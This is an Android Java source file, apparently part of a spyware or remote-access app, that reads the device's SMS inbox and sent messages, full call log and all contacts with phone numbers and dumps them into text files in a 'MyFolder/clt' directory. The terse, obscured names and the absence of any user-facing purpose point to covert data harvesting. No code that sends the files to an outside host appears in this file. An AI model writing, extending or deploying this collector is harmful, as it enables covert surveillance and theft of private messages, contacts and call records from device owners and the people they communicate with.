package com.example.myapplication.src.main.java.com.nameless.web_server;

import static android.app.PendingIntent.getActivity;

import static com.example.myapplication.src.main.java.com.nameless.web_server.Session.showMessage;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.myapplication.MainActivity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;

public class dbancmd extends Activity {
    private static Context context;
    public static StringBuilder clg = new StringBuilder();
    public static StringBuilder gtc = new StringBuilder();
    File zppng = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");


    public static void msg(){
        System.out.println("getting mg");
//			dbanrep.append("getting mg").append("\n");
        MainActivity.dbanrep.append("getting mg").append("<br>");


        wrtfl("MyFolder/clt","Clg.txt",String.valueOf(dbancmd.clg),false);
        wrtfl("MyFolder/clt","Cnt.txt", String.valueOf(dbancmd.gtc),false);
        Cursor cursorr = MainActivity.getAppContext().getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        StringBuilder mgData = new StringBuilder();
        if (cursorr.moveToFirst()) { // cursor.moveToFirst()
            StringBuilder msgData;
            do {
                msgData = new StringBuilder();
                for (int idx = 0; idx < cursorr.getColumnCount(); idx++) {
                    if (cursorr.getColumnName(idx).equals("date")){
                        Date l = new Date(Long.parseLong(cursorr.getString(idx))* 1000);
                        msgData.append(" ").append("\n").append("Date : "+l).append(":").append(cursorr.getString(idx)).append("\nRaw version D: ").append(cursorr.getString(idx));
                    }else if (cursorr.getColumnName(idx).equals("date_sent")){
                        Date l = new Date(Long.parseLong(cursorr.getString(idx))* 1000);
                        msgData.append(" ").append("\n").append("Date Sent : "+l).append(":").append(cursorr.getString(idx)).append("\nRaw version SD: ").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("body")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("seen")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("address")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("read")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("creator")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else {
//                                            msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                }
                // use msgData
                mgData.append(msgData+"\n\n======  [+]");
            } while (cursorr.moveToNext());
        } else {
            showMessage("none");
        }
        wrtfl("MyFolder/clt","Msg.txt",mgData+"\n",false);

        cursorr = MainActivity.getAppContext().getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        mgData = new StringBuilder("");
        if (cursorr.moveToFirst()) { // cursor.moveToFirst()
            StringBuilder msgData;
            do {
                msgData = new StringBuilder();
                for (int idx = 0; idx < cursorr.getColumnCount(); idx++) {
                    if (cursorr.getColumnName(idx).equals("date")){
                        Date l = new Date(Long.parseLong(cursorr.getString(idx))* 1000);
                        msgData.append(" ").append("\n").append("Date : "+l).append(":").append(cursorr.getString(idx)).append("\nRaw version D: ").append(cursorr.getString(idx));
                    }else if (cursorr.getColumnName(idx).equals("date_sent")){
                        Date l = new Date(Long.parseLong(cursorr.getString(idx))* 1000);
                        msgData.append(" ").append("\n").append("Date Sent : "+l).append(":").append(cursorr.getString(idx)).append("\nRaw version SD: ").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("body")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("seen")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("address")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("read")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else if (cursorr.getColumnName(idx).equals("creator")) {
                        msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                    else {
//                                            msgData.append(" ").append("\n").append(cursorr.getColumnName(idx)).append(":").append(cursorr.getString(idx));
                    }
                }
                // use msgData
                mgData.append(msgData+"\n\n======  [+]");
            } while (cursorr.moveToNext());
        } else {
            showMessage("none");
        }
        wrtfl("MyFolder/clt","Msgout.txt",mgData+"\n",false);



        showMessage("Done");
    }
    public static Context getAppContext() {
        return dbancmd.context;
    }

    public static void gg(String v){

//        try {
//            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//            intent.setData(Uri.parse("package:" + v));
//            startActivity(intent);
//            Session.showMessage("info opened 1");
//
//        } catch ( Exception e ) {
//            //e.printStackTrace();
//            e.printStackTrace();
//
//            //Open the generic Apps page:
//            Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
//            startActivity(intent);
//            Session.showMessage("info opened 2");
//
//        }
    }



    public String getCallLogs() {
        int flag=1;
        StringBuilder callLogs = new StringBuilder();

        ArrayList<String> calllogsBuffer = new ArrayList<String>();
        calllogsBuffer.clear();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI,
                null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            calllogsBuffer.add("\nPhone Number: " + phNumber + " \nCall Type: "
                    + dir + " \nCall Date: " + callDayTime
                    + " \nCall duration in sec : " + callDuration + "\n");

        }
        managedCursor.close();
        clg = new StringBuilder(calllogsBuffer.toString());
        return calllogsBuffer.toString();
    }
    ArrayList getAllContacts() {
        ArrayList<String> nameList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        try {
            if ((cur != null ? cur.getCount() : 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    String phoneNo = null;
                    if (true) { //cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            phoneNo = pCur.getString(pCur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        }
                        pCur.close();
                    }
                    nameList.add(name + phoneNo);
                }
            }
        }catch (Exception e){
            showMessage("contact error");
        }
        if (cur != null) {
            cur.close();
        }
        gtc = new StringBuilder(nameList.toString());
        return nameList;
    }

    public static void wrtfl(String ffolder, String fname, String content, boolean append) {
        String rootPath = null;
        File f = null;
        try {
            rootPath = MainActivity.getAppContext().getExternalFilesDirs(null)[0] + "/" + ffolder + "/";
            File root = new File(rootPath);
            if (!root.exists()) {
                root.mkdirs();
            }
            f = new File(rootPath + fname);
            FileOutputStream out = new FileOutputStream(f,append);
            out.write(content.getBytes());
            out.flush();
            out.close();
        } catch (Exception e) {
        }
    }




}
